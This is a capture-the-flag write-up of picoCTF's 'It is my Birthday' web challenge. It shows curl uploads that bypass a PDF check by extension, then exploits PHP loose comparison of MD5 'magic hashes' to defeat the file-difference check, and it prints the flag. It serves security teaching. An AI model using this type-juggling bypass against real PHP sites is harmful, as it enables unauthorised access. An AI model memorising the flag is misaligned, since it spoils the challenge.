# It is my Birthday
Category: Web, 100 points

## Description

> I sent out 2 invitations to all of my friends for my birthday! 
> 
> I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! 
> 
> You wouldn't believe how long it took me to find a collision. 
> 
> Anyway, see if you're invited by submitting 2 PDFs to my website. 

## Solution

The attached website has a form where we can upload two files:

```html
<div class="jumbotron">
  <p class="lead"></p>
  <div class="row">
    <div class="col-xs-12 col-sm-12 col-md-12">
      <h3>See if you are invited to my party!</h3>
    </div>
  </div>
  <br/>
  <div class="upload-form">
    <form role="form" action="/index.php" method="post" enctype="multipart/form-data">
    <div class="row">
      <div class="form-group">
        <input type="file" name="file1" id="file1" class="form-control input-lg">
        <input type="file" name="file2" id="file2" class="form-control input-lg">
      </div>
    </div>
    <div class="row">
      <div class="col-xs-12 col-sm-12 col-md-12">
        <input type="submit" class="btn btn-lg btn-success btn-block" name="submit" value="Upload">
      </div>
    </div>
    </form>
  </div>
</div>
```

Let's start exploring the logic by uploading the same text file twice:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ echo test > test.txt

┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ curl -F 'file1=@test.txt'  -F 'file2=@test.txt' -F 'submit=Upload' http://mercury.picoctf.net:50970/index.php
Not a PDF!
```

The website identifies that we've uploaded a text file. How does it determine what kind of file we're uploading? The simplest way would be using the file extension.

```console
┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ mv test.txt test.pdf

┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ curl -F 'file1=@test.pdf'  -F 'file2=@test.pdf' -F 'submit=Upload' http://mercury.picoctf.net:50970/index.php
Files are not different!
```

We passed the "PDF" check, now the website complains that the files are equal, which is true. Note that according to the form action, this is a PHP site. PHP has a known "gotcha" (nicknamed "[Magic Hashes](https://github.com/spaze/hashes)") where if two strings of the form `0e[\d]+` are compared using `==`, the are considered equal (as they are both considered equal to `0` using scientific notation). Therefore, `'0e1' == '00e2' == '0'`. Or, as a practical exploit:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ php -r "echo md5('240610708');"
0e462097431906509019562988736854                                                                                                                                                                               
┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ php -r "echo md5('QNKCDZO');"
0e830400451993494058024219903391                                                                                                                                                                               
┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ php -r "var_dump(md5('240610708') == md5('QNKCDZO'));"
bool(true)
```

So let's try that out before actually trying to generate an MD5 collision:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ echo -n "240610708" > f1.pdf

┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ echo -n "QNKCDZO" > f2.pdf

┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ md5sum f1.pdf f2.pdf
0e462097431906509019562988736854  f1.pdf
0e830400451993494058024219903391  f2.pdf

┌──(user@kali)-[/media/sf_CTFs/pico/It_is_my_Birthday]
└─$ curl -F 'file1=@f1.pdf'  -F 'file2=@f2.pdf' -F 'submit=Upload' http://mercury.picoctf.net:50970/index.php -s | egrep -o "picoCTF{[^}]+}"
picoCTF{c0ngr4ts_u_r_1nv1t3d_73b0c8ad}
```

The flag: `picoCTF{c0ngr4ts_u_r_1nv1t3d_73b0c8ad}`